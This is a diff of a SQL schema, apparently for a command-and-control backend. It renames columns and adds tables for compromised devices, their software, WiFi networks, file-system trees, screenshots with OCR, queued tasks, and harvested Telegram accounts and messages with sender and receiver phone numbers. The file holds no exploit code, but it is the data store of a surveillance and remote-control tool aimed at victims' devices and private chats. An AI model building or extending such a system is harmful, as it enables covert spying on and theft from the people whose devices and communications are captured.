@@ -1,70 +1,77 @@
 
--- C2 Device
+-- C2 Device (Standardize to snake_case)
 create table if not exists c2_device
 (
     id           bigint auto_increment primary key,
     uuid         varchar(64)                        null comment 'Unique Device ID',
-    internalIp   varchar(64)                        null comment 'Internal IP',
-    externalIp   varchar(64)                        null comment 'External IP',
-    macAddress   varchar(64)                        null comment 'MAC Address',
-    hostName     varchar(128)                       null comment 'Hostname',
+    internal_ip  varchar(64)                        null comment 'Internal IP',
+    external_ip  varchar(64)                        null comment 'External IP',
+    mac_address  varchar(64)                        null comment 'MAC Address',
+    host_name    varchar(128)                       null comment 'Hostname',
     os           varchar(128)                       null comment 'OS Info',
-    lastSeen     datetime                           null comment 'Last Seen',
-    heartbeatInterval int default 60000             comment 'Heartbeat Interval',
-    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
-    updateTime   datetime     default CURRENT_TIMESTAMP not null comment 'Update Time',
-    isDelete     tinyint      default 0             not null comment 'Is Deleted',
+    last_seen    datetime                           null comment 'Last Seen',
+    heartbeat_interval int default 60000            comment 'Heartbeat Interval',
+    is_monitor_on tinyint      default 0            comment 'Is Monitor On',
+    current_tg_id varchar(64)                       null comment 'Current Telegram ID',
+    data_status  varchar(32)                        null comment 'Data Status',
+    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
+    update_time  datetime     default CURRENT_TIMESTAMP not null comment 'Update Time',
+    is_delete    tinyint      default 0             not null comment 'Is Deleted',
     index idx_uuid (uuid)
 );
 
--- C2 Software List
+-- C2 Software List (Standardize to snake_case)
 create table if not exists c2_software
 (
     id           bigint auto_increment primary key,
-    deviceId     bigint                             not null comment 'Device ID',
+    device_id    bigint                             not null comment 'Device ID',
     name         varchar(256)                       not null comment 'Software Name',
     version      varchar(64)                        null comment 'Version',
-    installDate  varchar(64)                        null comment 'Install Date',
-    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
-    isDelete     tinyint      default 0             not null comment 'Is Deleted',
-    index idx_deviceId (deviceId)
+    install_date varchar(64)                        null comment 'Install Date',
+    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
+    is_delete    tinyint      default 0             not null comment 'Is Deleted',
+    index idx_device_id (device_id)
 );
 
--- C2 WiFi Data
+-- C2 WiFi Data (Standardize to snake_case)
 create table if not exists c2_wifi
 (
     id           bigint auto_increment primary key,
-    deviceId     bigint                             not null comment 'Device ID',
+    device_id    bigint                             not null comment 'Device ID',
     ssid         varchar(128)                       not null comment 'SSID',
     bssid        varchar(64)                        null comment 'BSSID (MAC)',
-    signalStrength varchar(32)                      null comment 'Signal Strength',
-    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
-    isDelete     tinyint      default 0             not null comment 'Is Deleted',
-    index idx_deviceId (deviceId)
+    signal_strength varchar(32)                      null comment 'Signal Strength',
+    authentication varchar(64)                      null comment 'Authentication',
+    create_time   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
+    is_delete     tinyint      default 0             not null comment 'Is Deleted',
+    index idx_device_id (device_id)
 );
 
--- C2 File Scan Results
-create table if not exists c2_file_scan
-(
-    id           bigint auto_increment primary key,
-    deviceId     bigint                             not null comment 'Device ID',
-    filePath     text                               not null comment 'File Path',
-    fileName     varchar(256)                       not null comment 'File Name',
-    fileSize     bigint                             not null comment 'File Size',
-    md5          varchar(32)                        null comment 'MD5 Hash',
-    isRecent     tinyint      default 0             not null comment 'Is Recently Modified',
-    lastModified datetime                           null comment 'Last Modified',
-    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
-    isDelete     tinyint      default 0             not null comment 'Is Deleted',
-    index idx_deviceId (deviceId)
-);
+-- C2 File Scan Results (Standardize to snake_case) - MERGED INTO c2_file_system_node
+-- create table if not exists c2_file_scan
+-- (
+--    id           bigint auto_increment primary key,
+--    device_id    bigint                             not null comment 'Device ID',
+--    file_path    text                               not null comment 'File Path',
+--    file_name    varchar(256)                       not null comment 'File Name',
+--    file_size    bigint                             not null comment 'File Size',
+--    md5          varchar(32)                        null comment 'MD5 Hash',
+--    is_recent    tinyint      default 0             not null comment 'Is Recently Modified',
+--    last_modified datetime                           null comment 'Last Modified',
+--    create_time   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
+--    is_delete     tinyint      default 0             not null comment 'Is Deleted',
+--    index idx_device_id (device_id)
+-- );
 
--- C2 Tasks Table
+-- C2 Tasks Table (Keep camelCase where it matches existing code heavily, or update?)
+-- C2Task.java usually uses camelCase fields. Let's check C2Task.java later.
+-- For now assuming C2Task uses camelCase columns in DB.
 create table if not exists c2_task
 (
     id           bigint auto_increment comment 'id' primary key,
     taskId       varchar(64)                        not null comment 'Task ID',
     deviceId     bigint                             null comment 'Target Device ID (null for broadcast)',
+    deviceUuid   varchar(64)                        null comment 'Target Device UUID',
     command      varchar(256)                       not null comment 'Command',
     params       text                               null comment 'Parameters',
     status       varchar(32) default 'pending'      not null comment 'Status',
@@ -97,7 +104,9 @@ create table if not exists tg_account
     firstName    varchar(128)                       null comment 'First Name',
     lastName     varchar(128)                       null comment 'Last Name',
     isBot        tinyint      default 0             comment 'Is Bot',
+    isPremium    tinyint      default 0             comment 'Is Premium',
     systemInfo   text                               null comment 'System Info',
+    device_uuid  varchar(64)                        null comment 'Device UUID',
     createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
     updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
     isDelete     tinyint      default 0             not null comment 'Is Deleted'
@@ -107,30 +116,53 @@ create table if not exists tg_account
 create table if not exists tg_message
 (
     id           bigint auto_increment comment 'id' primary key,
-    accountId    bigint                             not null comment 'Account ID',
-    msgId        bigint                             null comment 'Message ID',
-    chatId       varchar(64)                        null comment 'Chat ID',
-    senderId     varchar(64)                        null comment 'Sender ID',
+    account_id   bigint                             not null comment 'Account ID',
+    msg_id       bigint                             null comment 'Message ID',
+    chat_id      varchar(64)                        null comment 'Chat ID',
+    sender_id    varchar(64)                        null comment 'Sender ID',
+    sender_username varchar(128)                    null comment 'Sender Username',
+    sender_phone varchar(32)                        null comment 'Sender Phone',
+    receiver_id  varchar(64)                        null comment 'Receiver ID',
+    receiver_username varchar(128)                  null comment 'Receiver Username',
+    receiver_phone varchar(32)                      null comment 'Receiver Phone',
     content      text                               null comment 'Content',
-    msgType      varchar(32)                        null comment 'Message Type',
-    mediaPath    varchar(256)                       null comment 'Media Path',
-    msgDate      datetime                           null comment 'Message Date',
-    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
-    isDelete     tinyint      default 0             not null comment 'Is Deleted'
+    msg_type     varchar(32)                        null comment 'Message Type',
+    media_path   varchar(256)                       null comment 'Media Path',
+    msg_date     datetime                           null comment 'Message Date',
+    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
+    is_delete    tinyint      default 0             not null comment 'Is Deleted'
 ) comment 'TG Messages' collate = utf8mb4_unicode_ci;
 
--- C2 Screenshot Table
+-- C2 Screenshot Table (Standardize to snake_case)
 create table if not exists c2_screenshot
 (
     id           bigint auto_increment primary key,
-    device_uuid  varchar(64)                        not null comment 'Device UUID',
+    device_id    bigint                             not null comment 'Device ID',
     task_id      varchar(64)                        null comment 'Task ID',
     url          varchar(512)                       null comment 'URL',
     ocr_result   text                               null comment 'OCR Result',
     create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
     is_delete    tinyint      default 0             not null comment 'Is Deleted',
-    index idx_device_uuid (device_uuid)
+    index idx_device_id (device_id)
 ) comment 'C2 Screenshots' collate = utf8mb4_unicode_ci;
+
+-- C2 File System Node (Tree View)
+create table if not exists c2_file_system_node
+(
+    id           bigint auto_increment primary key,
+    device_id    bigint                             not null comment 'Device ID',
+    parent_path  text                               null comment 'Parent Path',
+    name         varchar(256)                       not null comment 'Name',
+    path         text                               not null comment 'Full Path',
+    is_directory tinyint      default 0             not null comment 'Is Directory',
+    size         bigint       default 0             not null comment 'Size',
+    md5          varchar(32)                        null comment 'MD5 Hash',
+    is_recent    tinyint      default 0             not null comment 'Is Recently Modified',
+    last_modified datetime                          null comment 'Last Modified',
+    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
+    is_delete    tinyint      default 0             not null comment 'Is Deleted',
+    index idx_device_id (device_id)
+) comment 'File System Tree' collate = utf8mb4_unicode_ci;
 
 -- User Table (t_user)
 create table if not exists t_user
